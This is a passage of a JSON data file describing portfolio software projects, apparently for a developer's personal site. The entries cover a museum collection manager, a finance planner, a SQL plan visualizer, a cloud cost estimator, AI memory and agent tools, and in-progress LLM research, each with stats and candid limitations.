      "**Proven against the old code:** 10/10 tests pass on the rebuild and 1/10 on the original."
    ],
    "honest": "Tested on 30 seeded fixtures. Next: real-world documents.",
    "links": "https://github.com/advaithsarva/document-data-extractor",
    "slug": "document-data-extractor"
  },
  {
    "title": "Museum Collection Manager",
    "category": "Full-Stack",
    "tagline": "A museum's collection online, with its secrets kept.",
    "card": "A full collection system for a monastery's art: public gallery, artist pages, exhibitions, smart search and a staff admin panel. Donor names and valuations never reach the public.",
    "tags": [
      "Node.js",
      "Express",
      "SQLite",
      "JavaScript",
      "Flask"
    ],
    "stats": "17 REST endpoints · 2 data leaks closed · 35 tests",
    "overview": "Museums publish some things and must protect others: who donated a piece, and what it's worth. Every page here passes through one publish gate, and hidden works return \"not found\" so nobody can count what's unreleased. Search forgives typos, and falls back to plain SQL if that service is down.",
    "highlights": [
      "**Closed two live leaks** that exposed unpublished works and donor valuations.",
      "**Secure logins with no auth library:** signed, expiring sessions and lockout after 5 failed attempts.",
      "**Brought a dead feature back:** creating artworks had been failing on every request."
    ],
    "honest": "The UI still uses emoji as icons. Next: a proper icon set.",
    "links": "https://github.com/advaithsarva/museum-collection-manager",
    "slug": "museum-collection-manager"
  },
  {
    "title": "Personal Finance Planner",
    "category": "Full-Stack",
    "tagline": "The math is done by code. The AI just explains it.",
    "card": "Budgets, savings plans and portfolio splits in rupees, every figure calculated by tested code. An AI explains your plan in plain words but can't change a single number.",
    "tags": [
      "Node.js",
      "Express",
      "LLM",
      "JavaScript"
    ],
    "stats": "17 figures per plan · <0.005 ms to compute · dependencies 5 → 1",
    "overview": "Asking an AI to do your finances means trusting numbers nobody checked. Here every figure is computed and tested in code: 50/30/20 budgets, savings splits, age-based allocation, inflation-adjusted projections. The LLM only explains the plan.",
    "highlights": [
      "**From untestable to 11 tests:** the rebuild passes 11/11, and 10 of them fail on the original.",
      "**Works even when the AI doesn't:** no key or a failed call still returns every figure.",
      "**Lighter:** React and five other packages replaced with one static page."
    ],
    "honest": "The AI explanation layer hasn't been run with a real key yet.",
    "links": "https://github.com/advaithsarva/personal-finance-planner",
    "slug": "personal-finance-planner"
  },
  {
    "title": "Query Plan Visualizer",
    "category": "Full-Stack",
    "tagline": "See why your SQL is slow, then test the fix risk-free.",
    "card": "Paste a Postgres query and see its execution plan as an interactive tree, with the bottleneck highlighted and a fix suggested. Try an index without changing your database. It found a 2.8× speedup.",
    "tags": [
      "React",
      "D3",
      "Flask",
      "PostgreSQL"
    ],
    "stats": "2.8× speedup (12.1 → 4.3 ms) · 8/8 eval cases · 0 risk to your schema",
    "overview": "Raw EXPLAIN ANALYZE output is a wall of nested JSON. This turns it into a clickable tree and points at the slow node. The index-compare mode creates the index inside a transaction, measures it, and rolls it back, so your live database never changes.",
    "highlights": [
      "**Tested before trusted:** the first eval run caught two real gaps, which are now fixed.",
      "**Found a regex bug by running against a real database** instead of trusting the code."
    ],
    "honest": "The 2.8× figure is from August 2026. Next: re-measure it.",
    "links": "https://github.com/advaithsarva/query-plan-visualizer",
    "slug": "query-plan-visualizer"
  },
  {
    "title": "Multi-Cloud Cost Estimator",
    "category": "Full-Stack",
    "tagline": "Same app, three clouds, up to 36% price difference.",
    "card": "Describe your architecture once and see the monthly bill on AWS, GCP and Azure side by side. No accounts or logins needed. The same setup cost up to 36% more depending on the provider.",
    "tags": [
      "Python",
      "Cloud",
      "AWS",
      "GCP",
      "Azure"
    ],
    "stats": "18–36% price spread · 46% \"discount\" that's really 21.3% · 28 tests",
    "overview": "Cloud pricing is designed to be hard to compare. This tool prices one YAML spec on all three providers from an offline price book, with units built in so an hourly rate can never be mixed up with a monthly one.",
    "highlights": [
      "**Cut through the marketing:** a 46% headline discount turned out to be 21.3% of the real bill.",
      "**Separates sure savings from maybe savings.**"
    ],
    "honest": "Prices are entered by hand and dated. Next: live price feeds.",
    "links": "https://github.com/advaithsarva/multi-cloud-cost-estimator",
    "slug": "multi-cloud-cost-estimator"
  },
  {
    "title": "Superbrain MCP",
    "category": "Full-Stack",
    "tagline": "One memory shared by all my AI agents.",
    "card": "A memory server that all my AI tools read from and write to, so what one agent learns, the others know. 41 tools, used every day.",
    "tags": [
      "Python",
      "MCP",
      "SQLite",
      "AI Agents"
    ],
    "stats": "41 tools · 8 memory types · used daily",
    "overview": "Every AI chat starts from zero. Superbrain fixes that with shared short-term memory, long-term memory, a knowledge graph, an event log, saved workflows and tasks, all through the Model Context Protocol. It stores and recalls; the agent that calls it does the thinking.",
    "highlights": [
      "**Fast and permanent:** short-term memory lives in RAM, and everything else is stored in SQLite.",
      "**Small footprint:** only three dependencies."
    ],
    "honest": "No automated tests yet.",
    "links": "Private repo",
    "slug": "superbrain-mcp"
  },
  {
    "title": "ZERO",
    "category": "In Progress",
    "tagline": "Git remembers the code. ZERO remembers everything around it.",
    "card": "Checks every change against your team's written rules before it's committed, and keeps the who, why and what-was-decided right next to the code.",
    "tags": [
      "Node.js",
      "VS Code Extension",
      "Git",
      "LLM"
    ],
    "stats": "1 engine for terminal and editor · 0 runtime dependencies · pre-release",
    "overview": "Git tells you what changed. ZERO tells you who changed it, why, under which rules, and what was assumed. Some checks are plain logic (secrets, tests, ownership), and one has a model read your team's own instructions. It runs as a CLI and as a VS Code panel.",
    "highlights": [
      "**Records live in your repo** as markdown, so they travel with git.",
      "**Built for teams:** a pre-push gate, code ownership and access roles."
    ],
    "honest": "Pre-release, not published yet.",
    "links": "Private repo",
    "slug": "zero-code-review"
  },
  {
    "title": "Zero",
    "category": "In Progress",
    "tagline": "An AI that lives on your cursor.",
    "card": "A small robot that follows your cursor and understands what's under it (buttons, text fields, menus) in any Windows app. It's the first step toward an assistant that works right on your screen.",
    "tags": [
      "Electron",
      "Node.js",
      "Windows UI Automation"
    ],
    "stats": "8 ms cursor follow · 7 interaction types detected · early stage",
    "overview": "Not a chatbot, not a sidebar: a layer that sits on your cursor. It already sees what you point at, including the element's name, type, app and what you can do with it. Next it learns to act, and to teach you how it did it.",
    "highlights": [
      "**It can already see:** it reads the UI element under the cursor twice a second.",
      "**Stays out of your way:** clicks pass straight through it."
    ],
    "honest": "Early stage. It sees but doesn't act yet.",
    "links": "Private repo",
    "slug": "zero-cursor-agent"
  },
  {
    "title": "zero-01",
    "category": "In Progress",
    "tagline": "Building a language model from the first token up.",
    "card": "A language model built from scratch, from tokenizer to training loop. The research and design are done, and training is next.",
    "tags": [
      "Python",
      "PyTorch",
      "LLM",
      "In Progress"
    ],
    "stats": "Design stage · model size decided after a benchmark sweep",
    "overview": "To really understand LLMs, build one. Every piece will be written by hand and measured, starting with the tokenizer and training on Colab.",
    "highlights": [],
    "honest": "No code yet. Don't feature it until there's a trained checkpoint.",
    "links": "Private repo",
    "slug": "zero-01"
  },
  {
    "title": "Eval Gap Research",
    "category": "In Progress",
    "tagline": "How do you grade an AI when there's no right answer?",
    "card": "A research prototype for scoring open-ended AI output. It splits \"did it succeed?\" into small yes/no checks, and the first experiment showed exactly where the approach breaks.",
    "tags": [
      "Python",
      "LLM Evaluation",
      "Research"
    ],
    "stats": "1.00 vs 0.31 good vs bad separation · n = 8, early results",
    "overview": "AI agents improve fast wherever there's a test to pass. Most real tasks have no test. This project asks whether an AI judge with a checklist can fill that gap, and measures when its confidence can be trusted.",
    "highlights": [
      "**The scores work:** good and bad output separate cleanly.",
      "**The confidence signal doesn't, yet:** subtly wrong answers still scored full marks, and the experiment shows why."
    ],
    "honest": "Eight examples on one model, so it's directional only. Next: rubrics from several different models.",
    "links": "Not public yet",
    "slug": "eval-gap-research"
  }
];
